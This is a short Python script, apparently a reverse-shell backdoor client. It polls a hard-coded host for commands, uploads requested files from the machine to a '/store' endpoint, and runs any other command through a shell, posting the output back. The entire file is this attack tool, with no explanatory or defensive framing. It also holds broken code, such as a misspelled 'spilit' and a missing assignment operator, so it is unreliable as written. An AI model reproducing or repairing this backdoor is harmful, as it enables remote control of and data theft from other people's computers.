import requests
import os
import subprocess
import time

while True:

    req = requests.get('http://192.168.1.1:8080')
    command = req.text
    if 'terminate' in command:
        break
    elif 'grab' in command:
        grab, path = command.spilit("*")
        if os.path.exists(path):
            url = "http://192.168.1.1:80/store"
            files = {'file': open(path, 'rb')}
            r = requests.post(url, files = files)
        else:
            post_response = requests.post(url = 'http://192.168.1.1:8080', data = '[-] Not able')
    else:
        cmd = subprocess.Popen(command.decode(),shell = True, stdout = subprocess.PIPE, stderr = subprocess.PIPE)
        post_responserequests.post(url = 'http://192.168.1.1:8080', data = cmd.stdout.read())
        post_responserequests.post(url = 'http://192.168.1.1:8080', data = cmd.stderr.read())
    time.sleep(3)
